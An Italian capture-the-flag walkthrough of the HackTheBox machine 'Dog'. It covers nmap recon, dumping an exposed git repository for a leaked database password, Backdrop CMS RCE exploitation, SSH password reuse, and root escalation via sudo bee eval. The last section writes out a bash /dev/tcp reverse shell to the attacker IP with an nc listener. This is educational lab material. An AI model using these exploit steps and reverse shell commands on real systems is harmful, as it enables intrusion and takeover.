# Macchina Dog

IP vittima: 10.10.11.58 
IP attaccante: 10.10.14.27

## Recon

`sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.58`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-02 11:14 CET
Nmap scan report for 10.10.11.58
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```

`sudo nmap -sC -sV -O -p22,80 10.10.11.58`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-02 11:15 CET
Nmap scan report for 10.10.11.58
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 3.1 (94%), Linux 3.2 (94%), Linux 5.3 - 5.4 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 (94%), Linux 5.0 - 5.5 (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

Importante!! La scansione ha trovato una repository git sulla porta 80:

```
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
```

## Repository GIT

Scarichiamo la repository con [[git-dumper]]
`python3 git_dumper.py http://10.10.11.58/.git/ /home/parrot/Macchine/HackTheBox/Dog/content/git`
Esaminiamo la repository.
Nel file `settings.php` troviamo:
`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`
`BackDropJ2024DS2024` è la password per accedere al database sql
Proviamo a fare delle ricerche con [[grep]] nella repository. La prima per cercare `user` non porta a niente. Proviamo a cercare degli indirizzi email. Ne troviamo molti, tanti terminano con example.com, per escluderli usiamo il comando:
`grep -Rno --exclude-dir=.git -I -E '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' . | cut -d: -f2- | grep -vi 'example' | sort -u`
Troviamo diversi indirizzi:

```
106:pass@domain.tld
10:vincent@phpconcept.net
11:person@test.com
12:tiffany@dog.htb
1465:me@me.tv
1470:me@me.tv
```

Ma l'unico che termina con @dog.htp, nome della macchina, è `tiffany@dog.htb`

## Porta 80 - Sito internet

Entriamo nel sito sulla porta 80 e andiamo alla pagina di login, tra l'altro vediamo che il sito usa `Backdrop CMS`:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251102114740.png)
Proviamo accedere con user `tiffany` e password `BackDropJ2024DS2024`. 
Siamo dentro nella pagina dell'amministratore:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251102115032.png)
Nello Status report o nell'Available updates del menu Reports scopriamo che la versione di Backdrop CMS è la `1.27.1`. Questa versione è vulnerabile ad una **remote code execution**:
https://github.com/rvizx/backdrop-rce
Seguiamo le istruzioni trovate nella repository dell'exploit per eseguirlo:

```
git clone https://github.com/rvizx/backdrop-rce
cd backdrop-rce
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python3 exploit.py http://10.10.11.58 tiffany BackDropJ2024DS2024
```

Otteniamo una shell come utente `www-data`
Con `cat /etc/passwd` troviamo due utenti: `jobert` e `johncusack`

## Porta 22

proviamo ad accedere al SSH usando gli utenti trovati e la password del database `BackDropJ2024DS2024` (magari qualche babbazzo ha usato la stessa password per i due servizi).
jobert non porta a niente ma lo user `johncusack` (`ssh johncusack@10.10.11.58`)con password `BackDropJ2024DS2024` ci fa accedere.
Nella cartella `/home/johncusack` troviamo la user flag nel file `user.txt`

## Scalata dei privilegi

Con il comando `sudo -l` troviamo:

```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

L'utente può eseguire il programma `/usr/local/bin/bee` con privilegi di root.
Dall'help del programma `bee` (`bee --help`) scopriamo:

```
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

Il programma `bee` con il comando `eval` può eseguire codice arbitrario php. Per poterlo eseguire dobbiamo andare nella cartella dove è presente `Backdrop CMS`, tipicamente nella cartella `/var/www/html`
Andiamo in quella cartella ed eseguiamo il comando `sudo bee eval "system('/bin/bash');"` per ottenere una shell come utente root.
Possiamo anche ottenere una reverse shell mettendoci in ascolto su una porta (nell'esempio la 9001) con il comando `sudo bee eval "system('bash -c \"bash -i >& /dev/tcp/10.10.14.27/9001 0>&1\"');"` dopo esserci messi in ascolto sulla nostra macchina con `nc -lvnp 9001`.
Dopo essere entrati come root in uno dei due modi, nella cartella `/root` troviamo la rootflag nel file `root.txt`.
